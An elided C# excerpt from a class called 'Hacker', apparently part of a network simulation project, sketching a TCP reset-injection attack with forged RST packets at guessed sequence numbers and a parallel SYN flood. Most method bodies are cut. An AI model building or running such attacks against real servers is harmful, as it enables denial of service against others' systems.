    ...
    internal class Hacker
    {
        ...
        private void ResetAttack(CancellationToken token)
        {
            ...
            try
            {
                ...
                SendPacket(clientSocket, TCPPacket.GetEmptyPacket(4, Constants.ClientPort, Server.ServerIP.Port, 0, 0, syn: true));
                ...
                SendPacket(clientSocket, TCPPacket.GetEmptyPacket(4, Constants.ClientPort, Server.ServerIP.Port, 1, 1, ack: true));
                ...
                for(int i = 5; i < 100; i++)
                {
                    ...
                    try
                    {
                        ...
                        SendPacket(clientSocket, TCPPacket.GetEmptyPacket(4, Constants.ClientPort, Server.ServerIP.Port, (uint)i * 4 + 1, 1, rst: true, ack: true));
                    }
                    catch { }
                }
            }
        ...
        private void SynFloodAttack()
        {
            Parallel.For(5, 20, (int i) =>
            {
                try
                {
                    ...
                    SendPacket(socket, TCPPacket.GetEmptyPacket(4, Constants.ClientPort, 1000 + i, 0, 0, syn: true));
                }
                catch { }
            });
        }
